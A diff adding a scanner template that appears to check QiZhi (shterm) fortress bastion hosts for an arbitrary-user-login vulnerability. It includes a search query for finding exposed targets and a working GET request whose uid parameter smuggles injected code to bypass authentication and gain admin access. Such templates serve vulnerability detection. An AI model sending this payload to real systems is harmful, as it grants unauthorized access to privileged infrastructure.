@@ -1,0 +1,20 @@
+name: shterm(QiZhi) Fortress Arbitrary User Login
+manual: true
+query: app="shterm-Fortres-Machine"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
+      headers:
+        Cookie: PHPSESSID=4uh4l0e3b0fd28d27l71u5be36
+    expression: response.status == 200 && response.body.bcontains(b"错误的id")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: Qizhi fortress machine has any user login vulnerability, access to
+    a specific URL can obtain background permissions
+  tags: Any user login
